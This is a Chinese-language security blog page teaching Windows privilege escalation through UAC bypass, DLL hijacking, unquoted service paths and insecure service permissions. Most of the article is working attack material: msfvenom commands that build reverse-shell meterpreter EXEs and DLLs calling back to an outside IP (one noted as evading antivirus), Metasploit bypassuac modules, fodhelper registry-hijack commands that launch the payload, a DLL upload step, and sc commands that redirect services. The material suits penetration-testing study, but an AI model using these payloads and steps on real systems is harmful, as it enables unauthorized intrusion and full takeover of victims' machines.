<!DOCTYPE html>
<html lang="en"><head>
    <link rel="stylesheet" href="/css/custom.css">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Win系统提权-本地管理用户与普通用户</title>
    <meta charset="utf-8">
    <meta name="description" content="Ladder@Win系统提权-本地管理用户与普通用户 - Hzhsec home">
    <meta name="author" content="hzhsec">
    <link rel="canonical" href="http://www.hzhsec.top/list/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows/5.uac%E7%BB%95%E8%BF%87_%E4%B8%8D%E5%90%8C%E6%8F%90%E6%9D%83%E6%89%8B%E6%B3%95/">

    <link rel="alternate" type="application/rss+xml" href="http://www.hzhsec.top//index.xml" title="Hzhsec home">

    


    <meta property="og:title" content="Win系统提权-本地管理用户与普通用户" />
<meta property="og:description" content="" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://www.hzhsec.top/list/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows/5.uac%E7%BB%95%E8%BF%87_%E4%B8%8D%E5%90%8C%E6%8F%90%E6%9D%83%E6%89%8B%E6%B3%95/" /><meta property="article:section" content="list" />
<meta property="article:published_time" content="2025-11-16T00:00:00+08:00" />
<meta property="article:modified_time" content="2025-11-16T00:00:00+08:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Win系统提权-本地管理用户与普通用户"/>
<meta name="twitter:description" content=""/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "目录",
      "item": "http://www.hzhsec.top/list/"
    }, 
    {
      "@type": "ListItem",
      "position":  4 ,
      "name": "Win系统提权-本地管理用户与普通用户",
      "item": "http://www.hzhsec.top/list/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows/5.uac%E7%BB%95%E8%BF%87_%E4%B8%8D%E5%90%8C%E6%8F%90%E6%9D%83%E6%89%8B%E6%B3%95/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Win系统提权-本地管理用户与普通用户",
  "name": "Win系统提权-本地管理用户与普通用户",
  "description": "",
  "keywords": [
    "提权", "UAC绕过", "DLL劫持", "服务漏洞", "不安全权限"
  ],
  "articleBody": "Win系统提权-本地管理用户-UAC绕过 BypassUAC自动提权 MSF\n为了远程执行目标的exe或者bat可执行文件，需要绕过此安全机制。\n在用户到系统权限自动提权中也可通过BypassUAC实现自动化提权。\n绕过项目：MSF内置，Powershell渗透框架，UACME项目(推荐)\n开启UAC和未开启UAC时，CS/MSF默认getsystem提权影响（进程注入等）\n./msfvenom -p windows/meterpreter/reverse_tcp lhost=172.27.28.12 lport=4444 -f exe -o msf.exe # 生成 x64 可执行（staged meterpreter） ./msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.27.28.12 LPORT=3333 -f exe -o shell/evil_x64.exe # 或者生成 stageless（有时更稳定/绕 AV） ./msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=172.27.28.12 LPORT=3333 -f exe -o shell/evil_x64_stageless.exe MSF模块：\nuse exploit/windows/local/ask use exploit/windows/local/bypassuac use exploit/windows/local/bypassuac_sluihijack use exploit/windows/local/bypassuac_silentcleanup UACME\nUACME项目：https://github.com/hfiref0x/UACME\nAkagi64.exe 编号 调用执行\n其他 注册表白名单绕过\n寻找不弹UAC框的程序 检测脚本：\nimport os from subprocess import * path = 'c:\\windows\\system32' files = os.listdir(path) print(files) def GetFileList(path, fileList): newDir = path if os.path.isfile(path): if path[-4:] == '.exe': fileList.append(path) elif os.path.isdir(path): try: for s in os.listdir(path): newDir=os.path.join(path,s) GetFileList(newDir, fileList) except Exception as e: pass return fileList files = GetFileList(path, []) print(files) for eachFile in files: if eachFile[-4:] == '.exe': command = r'.\\sigcheck64.exe -m {} | findstr auto'.format(eachFile) print(command) p1 = Popen(command, shell=True, stdin=PIPE, stdout=PIPE) if 'true' in p1.stdout.read().decode('gb2312'): copy_command = r'copy {} .\\success'.format(eachFile) Popen(copy_command, shell=True, stdin=PIPE, stdout=PIPE) print('[+] {}'.format(eachFile)) with open('success.txt', 'at') as f: f.writelines('{}\\n'.format(eachFile)) 先在cmd运行测试是否弹UAC c:\\windows\\system32\\bthudtask.exe ok c:\\windows\\system32\\changepk.exe c:\\windows\\system32\\ComputerDefaults.exe ok 1 c:\\windows\\system32\\dccw.exe ok 1 c:\\windows\\system32\\dcomcnfg.exe ok 1 c:\\windows\\system32\\DeviceEject.exe ok c:\\windows\\system32\\DeviceProperties.exe ok c:\\windows\\system32\\djoin.exe ok c:\\windows\\system32\\easinvoker.exe ok c:\\windows\\system32\\EASPolicyManagerBrokerHost.exe ok c:\\windows\\system32\\eudcedit.exe ok 1 c:\\windows\\system32\\eventvwr.exe ok 1 c:\\windows\\system32\\fodhelper.exe ok 1 c:\\windows\\system32\\fsquirt.exe ok 1 c:\\windows\\system32\\FXSUNATD.exe ok c:\\windows\\system32\\immersivetpmvscmgrsvr.exe ok c:\\windows\\system32\\iscsicli.exe ok 1 c:\\windows\\system32\\iscsicpl.exe ok 1 查询注册表Shell\\Open\\command键值对 通常以shell\\open\\command命名的键值对存储的是可执行文件路径，静默提升权限后即可运行该键值对程序。 Procmon监听找到程序注册表信息，过滤\n会去查询 `HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command`，然后在注册表创建该键值对，从而绕过UAC 注册表劫持绕过\nFodhelper.exe 执行注册表写入： reg add HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command /d C:\\Windows\\System32\\cmd.exe /f reg add HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_DWORD /d 00000000 /f 不同位数cmd窗口可能显示不同，Fodhelper仅适用于Win10\n执行-x64：\nreg add HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command /d C:\\Users\\huangzonghui\\Desktop\\1\\msf.exe /f reg add HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_DWORD /d 00000000 /f 反弹成功，执行getsystem提权 Win系统提权-本地普通用户-DLL劫持 DLL劫持提权应用配合MSF-FlashFXP 原理：Windows程序启动时需要DLL。如果DLL不存在，则可以在程序查找位置放置恶意DLL提权。搜索顺序：\n1、应用程序加载目录 2、C:\\Windows\\System32 3、C:\\Windows\\System 4、C:\\Windows 5、当前工作目录（CWD） 6、PATH环境变量目录（系统优先于用户）\n过程：信息收集 → 进程调试 → 制作dll并上传 → 替换dll → 等待应用启动\n检测：\nChkDllHijack 火绒剑 项目：https://github.com/anhkgg/anhkgg-tools 利用火绒剑进行进程分析加载DLL，一般寻程序DLL利用。\n生成DLL：\n./msfvenom -p windows/meterpreter/reverse_tcp lhost=172.27.28.12 lport=4444 -f dll -o shell/libeay32.dll or ./msfvenom -p windows/meterpreter/reverse_tcp lhost=172.27.28.12 lport=4444 -f dll -o shell/ssleay32.dll 上传DLL：\nmeterpreter \u003e upload /usr/src/metasploit-framework/shell/libeay32.dll C:\\\\Users\\\\huangzonghui\\\\Desktop\\\\2\\\\FlashFXP 执行成功上线 程序非正常 Win系统提权-本地普通用户-未引号服务 不带引号服务路径配合MSF-MacroExpert 原理：服务路径配置由于目录空格问题，可上传恶意文件触发执行 过程：检测服务权限配置 → 制作文件并上传 → 更改服务路径 → 等待调用成功\n检测命令：\nwmic service get name,displayname,pathname,startmode |findstr /i \"Auto\" |findstr /i /v \"C:\\Windows\\\\\" |findstr /i /v \"\"\" 上传反弹exe\n设置执行名后，执行：\nsc start \"Macro Expert\" 反弹成功 Win系统提权-本地管理用户-不安全权限 不安全的服务权限配合MSF-NewServices 原理：即使正确引用服务路径，也可能存在其他漏洞。管理配置错误，用户可能对服务拥有过多权限，可直接修改导致重定向执行文件。\n过程：检测服务权限配置 → 制作文件并上传 → 更改服务路径 → 调用成功\n检测脚本：https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk\naccesschk.exe -uwcqv \"huangzonghui\" * -accepteula sc config \"test\" binpath= \"C:\\Program.exe\" sc start test 综合类检测项目 PEAS-ng适用于Windows、Linux/Unix*和MacOS权限提升工具 项目：https://github.com/carlospolop/PEASS-ng\nwinPEAS.bat \u003e result.txt winPEASany.exe log=result.txt 排查信息，获取有用权限数据\n",
  "wordCount" : "358",
  "inLanguage": "en",
  "datePublished": "2025-11-16T00:00:00+08:00",
  "dateModified": "2025-11-16T00:00:00+08:00",
  "author":{
    "@type": "Person",
    "name": "hzhsec"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://www.hzhsec.top/list/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows/5.uac%E7%BB%95%E8%BF%87_%E4%B8%8D%E5%90%8C%E6%8F%90%E6%9D%83%E6%89%8B%E6%B3%95/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Hzhsec home",
    "logo": {
      "@type": "ImageObject",
      "url": "http://www.hzhsec.top/favicon.ico"
    }
  }
}
</script>
    <link rel="icon" href="/static/hzhsec.png" sizes="16x16">

<link rel="apple-touch-icon" href="/static/hzhsec.png">

<link rel="manifest" href="/static/hzhsec.png">
    

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.7.0/style.css" />

    
    
    <link rel="stylesheet" href="/css/main.min.ec28f09e946fc0df77c187fcd0d0ebde58fca6de8efb8e1620f3d45c32d4da88.css" integrity="sha256-7CjwnpRvwN93wYf80NDr3lj8pt6O&#43;44WIPPUXDLU2og=" crossorigin="anonymous" media="screen" />

    
    <link rel="stylesheet" href="/scss/highlight/github-dark.min.min.66034289ee9a113219a2c4aae0a8bd2095ab255c832a42efcf5863f10814e7a1.css" />

    
    <script src="/js/highlight.min.min.c098d85b5396dec4707ea2cead1445b4dc2ff0fc56b8dbbd9049d0d1c50ad237.js"></script>
    <script>hljs.highlightAll();</script>

    <script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script>
    </head>
<body>
      <main class="wrapper"><nav class="navigation">
    <section class="container">
        <a class="navigation-brand" href="/">
            主页
        </a>
        <input type="checkbox" id="menu-toggle" />
        <label class="menu-button float-right" for="menu-toggle">
            <span></span><span></span><span></span>
        </label>
        
        <ul class="navigation-list" id="navigation-list">
            
            
            <li class="navigation-item navigation-menu">
                <a class="navigation-link" href="/list/">目录</a>
            </li>
            
            <li class="navigation-item navigation-menu">
                <a class="navigation-link" href="/archives/">归档</a>
            </li>
            
            <li class="navigation-item navigation-menu">
                <a class="navigation-link" href="/message/">关于</a>
            </li>
            
            <li class="navigation-item navigation-menu">
                <a class="navigation-link" href="/categories/">分类</a>
            </li>
            
            <li class="navigation-item navigation-menu">
                <a class="navigation-link" href="https://umami-evtq.vercel.app/share/NdRAzdY1AwLB5KF2/hzhsec.github.io">网站统计</a>
            </li>
            
            

            <li class="navigation-item menu-separator">
                <span>|</span>
            </li>

            
            
            <li class="navigation-item navigation-social">
                <a class="navigation-link" href="https://github.com/hzhsec">    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
         stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github">
      <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
    </svg>
    </a>
            </li>
            
            <li class="navigation-item navigation-social">
                <a class="navigation-link" href="/message/">    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
         stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-mail">
      <path d="M4 4h16v16H4z"></path><polyline points="4,4 12,12 20,4"></polyline>
    </svg>
    </a>
            </li>
            
            

            <li class="navigation-item navigation-dark">
                <button id="mode" type="button" aria-label="toggle user light or dark theme">
                    <span class="toggle-dark">
                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
                             stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-moon">
                            <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                        </svg>
                    </span>
                    <span class="toggle-light">
                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
                             stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-sun">
                            <circle cx="12" cy="12" r="5"></circle>
                            <line x1="12" y1="1" x2="12" y2="3"></line>
                            <line x1="12" y1="21" x2="12" y2="23"></line>
                            <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                            <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                            <line x1="1" y1="12" x2="3" y2="12"></line>
                            <line x1="21" y1="12" x2="23" y2="12"></line>
                            <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                            <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                        </svg>
                    </span>
                </button>
            </li>
            
        </ul>
        
    </section>
</nav>

<div id="content">
<article class="blog-single">
  <header class="blog-title">
    <h1>Win系统提权-本地管理用户与普通用户</h1>
  </header>

  <p>
  <small>
    November 16, 2025&nbsp;· 358 words&nbsp;· 2 min</small>

  
<p>

  <div class="blog-toc">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#bypassuac自动提权">BypassUAC自动提权</a>
      <ul>
        <li><a href="#其他">其他</a></li>
      </ul>
    </li>
  </ul>

  <ul>
    <li><a href="#dll劫持提权应用配合msf-flashfxp">DLL劫持提权应用配合MSF-FlashFXP</a></li>
  </ul>

  <ul>
    <li><a href="#不带引号服务路径配合msf-macroexpert">不带引号服务路径配合MSF-MacroExpert</a></li>
  </ul>

  <ul>
    <li><a href="#不安全的服务权限配合msf-newservices">不安全的服务权限配合MSF-NewServices</a></li>
  </ul>
</nav>
  </div>

  <section class="blog-content"><h1 id="win系统提权-本地管理用户-uac绕过">Win系统提权-本地管理用户-UAC绕过</h1>
<h2 id="bypassuac自动提权">BypassUAC自动提权</h2>
<p><strong>MSF</strong><br>
为了远程执行目标的exe或者bat可执行文件，需要绕过此安全机制。<br>
在用户到系统权限自动提权中也可通过BypassUAC实现自动化提权。</p>
<p>绕过项目：MSF内置，Powershell渗透框架，UACME项目(推荐)<br>
开启UAC和未开启UAC时，CS/MSF默认getsystem提权影响（进程注入等）</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>./msfvenom -p windows/meterpreter/reverse_tcp lhost=172.27.28.12 lport=4444 -f exe -o msf.exe
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span># 生成 x64 可执行（staged meterpreter）
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>./msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.27.28.12 LPORT=3333 -f exe -o shell/evil_x64.exe
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span># 或者生成 stageless（有时更稳定/绕 AV）
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>./msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=172.27.28.12 LPORT=3333 -f exe -o shell/evil_x64_stageless.exe
</span></span></code></pre></div><p>MSF模块：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>use exploit/windows/local/ask
</span></span><span style="display:flex;"><span>use exploit/windows/local/bypassuac
</span></span><span style="display:flex;"><span>use exploit/windows/local/bypassuac_sluihijack
</span></span><span style="display:flex;"><span>use exploit/windows/local/bypassuac_silentcleanup
</span></span></code></pre></div><p><strong>UACME</strong><br>
UACME项目：<a href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a><br>
Akagi64.exe 编号 调用执行</p>
<h3 id="其他">其他</h3>
<p><strong>注册表白名单绕过</strong></p>
<ol>
<li>寻找不弹UAC框的程序</li>
</ol>
<p>检测脚本：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> subprocess <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;c:\windows\system32&#39;</span>
</span></span><span style="display:flex;"><span>files <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>listdir(path)
</span></span><span style="display:flex;"><span>print(files)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">GetFileList</span>(path, fileList):
</span></span><span style="display:flex;"><span>    newDir <span style="color:#f92672">=</span> path
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isfile(path):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> path[<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>:] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;.exe&#39;</span>:
</span></span><span style="display:flex;"><span>            fileList<span style="color:#f92672">.</span>append(path)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isdir(path):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> s <span style="color:#f92672">in</span> os<span style="color:#f92672">.</span>listdir(path):
</span></span><span style="display:flex;"><span>                newDir<span style="color:#f92672">=</span>os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(path,s)
</span></span><span style="display:flex;"><span>                GetFileList(newDir, fileList)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">pass</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> fileList
</span></span><span style="display:flex;"><span>files <span style="color:#f92672">=</span> GetFileList(path, [])      
</span></span><span style="display:flex;"><span>print(files)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> eachFile <span style="color:#f92672">in</span> files:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> eachFile[<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>:] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;.exe&#39;</span>:
</span></span><span style="display:flex;"><span>        command <span style="color:#f92672">=</span> <span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;.\sigcheck64.exe -m </span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> | findstr auto&#39;</span><span style="color:#f92672">.</span>format(eachFile)
</span></span><span style="display:flex;"><span>        print(command)
</span></span><span style="display:flex;"><span>        p1 <span style="color:#f92672">=</span> Popen(command, shell<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, stdin<span style="color:#f92672">=</span>PIPE, stdout<span style="color:#f92672">=</span>PIPE)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;&lt;autoElevate&gt;true&lt;/autoElevate&gt;&#39;</span> <span style="color:#f92672">in</span> p1<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;gb2312&#39;</span>):
</span></span><span style="display:flex;"><span>            copy_command <span style="color:#f92672">=</span> <span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;copy </span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> .\success&#39;</span><span style="color:#f92672">.</span>format(eachFile)
</span></span><span style="display:flex;"><span>            Popen(copy_command, shell<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, stdin<span style="color:#f92672">=</span>PIPE, stdout<span style="color:#f92672">=</span>PIPE)
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#39;[+] </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(eachFile))
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;success.txt&#39;</span>, <span style="color:#e6db74">&#39;at&#39;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>                f<span style="color:#f92672">.</span>writelines(<span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(eachFile))
</span></span></code></pre></div><ol start="2">
<li>先在cmd运行测试是否弹UAC</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>c:\windows\system32\bthudtask.exe                       ok
</span></span><span style="display:flex;"><span>c:\windows\system32\changepk.exe
</span></span><span style="display:flex;"><span>c:\windows\system32\ComputerDefaults.exe                ok      <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>c:\windows\system32\dccw.exe                            ok      <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>c:\windows\system32\dcomcnfg.exe                        ok      <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>c:\windows\system32\DeviceEject.exe                     ok  
</span></span><span style="display:flex;"><span>c:\windows\system32\DeviceProperties.exe                ok
</span></span><span style="display:flex;"><span>c:\windows\system32\djoin.exe                           ok
</span></span><span style="display:flex;"><span>c:\windows\system32\easinvoker.exe                      ok
</span></span><span style="display:flex;"><span>c:\windows\system32\EASPolicyManagerBrokerHost.exe      ok
</span></span><span style="display:flex;"><span>c:\windows\system32\eudcedit.exe                        ok      <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>c:\windows\system32\eventvwr.exe                        ok      <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>c:\windows\system32\fodhelper.exe                       ok      <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>c:\windows\system32\fsquirt.exe                         ok      <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>c:\windows\system32\FXSUNATD.exe                        ok
</span></span><span style="display:flex;"><span>c:\windows\system32\immersivetpmvscmgrsvr.exe           ok
</span></span><span style="display:flex;"><span>c:\windows\system32\iscsicli.exe                        ok      <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>c:\windows\system32\iscsicpl.exe                        ok      <span style="color:#ae81ff">1</span>
</span></span></code></pre></div><ol start="3">
<li>查询注册表Shell\Open\command键值对
通常以shell\open\command命名的键值对存储的是可执行文件路径，静默提升权限后即可运行该键值对程序。</li>
</ol>
<p>Procmon监听找到程序注册表信息，过滤</p>
<p align="center"><img src="/static/6.jpg" alt="6.jpg"></p>
会去查询 `HKCU:\Software\Classes\ms-settings\shell\open\command`，然后在注册表创建该键值对，从而绕过UAC
<p><strong>注册表劫持绕过</strong></p>
<h4 id="fodhelperexe">Fodhelper.exe</h4>
<p align="center"><img src="/static/3240693-20230731221055025-1411728646.png" alt="3240693-20230731221055025-1411728646.png"></p>
执行注册表写入：
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command /d C:\Windows\System32\cmd.exe /f
</span></span><span style="display:flex;"><span>reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_DWORD /d 00000000 /f
</span></span></code></pre></div><p>不同位数cmd窗口可能显示不同，Fodhelper仅适用于Win10</p>
<p>执行-x64：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command /d C:\Users\huangzonghui\Desktop\1\msf.exe /f
</span></span><span style="display:flex;"><span>reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_DWORD /d 00000000 /f
</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-23 183641.png" alt="屏幕截图 2025-10-23 183641.png"></p>
反弹成功，执行getsystem提权
<hr>
<h1 id="win系统提权-本地普通用户-dll劫持">Win系统提权-本地普通用户-DLL劫持</h1>
<h2 id="dll劫持提权应用配合msf-flashfxp">DLL劫持提权应用配合MSF-FlashFXP</h2>
<p>原理：Windows程序启动时需要DLL。如果DLL不存在，则可以在程序查找位置放置恶意DLL提权。搜索顺序：</p>
<p>1、应用程序加载目录
2、C:\Windows\System32
3、C:\Windows\System
4、C:\Windows
5、当前工作目录（CWD）
6、PATH环境变量目录（系统优先于用户）</p>
<p>过程：信息收集 → 进程调试 → 制作dll并上传 → 替换dll → 等待应用启动</p>
<p>检测：</p>
<ol>
<li>ChkDllHijack</li>
<li>火绒剑</li>
<li>项目：<a href="https://github.com/anhkgg/anhkgg-tools">https://github.com/anhkgg/anhkgg-tools</a>
<p align="center"><img src="/static/屏幕截图 2025-10-23 185636.png" alt="屏幕截图 2025-10-23 185636.png"></p>
</li>
</ol>
<p>利用火绒剑进行进程分析加载DLL，一般寻程序DLL利用。</p>
<p>生成DLL：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>./msfvenom -p windows/meterpreter/reverse_tcp lhost=172.27.28.12 lport=4444 -f dll -o shell/libeay32.dll
</span></span><span style="display:flex;"><span>or
</span></span><span style="display:flex;"><span>./msfvenom -p windows/meterpreter/reverse_tcp lhost=172.27.28.12 lport=4444 -f dll -o shell/ssleay32.dll
</span></span></code></pre></div><p>上传DLL：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>meterpreter &gt; upload /usr/src/metasploit-framework/shell/libeay32.dll C:\\Users\\huangzonghui\\Desktop\\2\\FlashFXP
</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-23 191425.png" alt="屏幕截图 2025-10-23 191425.png"></p>
执行成功上线
<p align="center"><img src="/static/屏幕截图 2025-10-23 191549.png" alt="屏幕截图 2025-10-23 191549.png"></p>
程序非正常
<p align="center"><img src="/static/屏幕截图 2025-10-23 191626.png" alt="屏幕截图 2025-10-23 191626.png"></p>
<hr>
<h1 id="win系统提权-本地普通用户-未引号服务">Win系统提权-本地普通用户-未引号服务</h1>
<h2 id="不带引号服务路径配合msf-macroexpert">不带引号服务路径配合MSF-MacroExpert</h2>
<p>原理：服务路径配置由于目录空格问题，可上传恶意文件触发执行
过程：检测服务权限配置 → 制作文件并上传 → 更改服务路径 → 等待调用成功</p>
<p>检测命令：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>wmic service get name,displayname,pathname,startmode |findstr /i &#34;Auto&#34; |findstr /i /v &#34;C:\Windows\\&#34; |findstr /i /v &#34;&#34;&#34;
</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-23 191957.png" alt="屏幕截图 2025-10-23 191957.png"></p>
<p>上传反弹exe</p>
<p align="center"><img src="/static/屏幕截图 2025-10-23 193119.png" alt="屏幕截图 2025-10-23 193119.png"></p>
<p>设置执行名后，执行：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sc start &#34;Macro Expert&#34;
</span></span></code></pre></div><p align="center"><img src="/static/Pasted image 20251023193519.png" alt="Pasted image 20251023193519.png"></p>
反弹成功
<p align="center"><img src="/static/屏幕截图 2025-10-23 193513.png" alt="屏幕截图 2025-10-23 193513.png"></p>
<hr>
<h1 id="win系统提权-本地管理用户-不安全权限">Win系统提权-本地管理用户-不安全权限</h1>
<h2 id="不安全的服务权限配合msf-newservices">不安全的服务权限配合MSF-NewServices</h2>
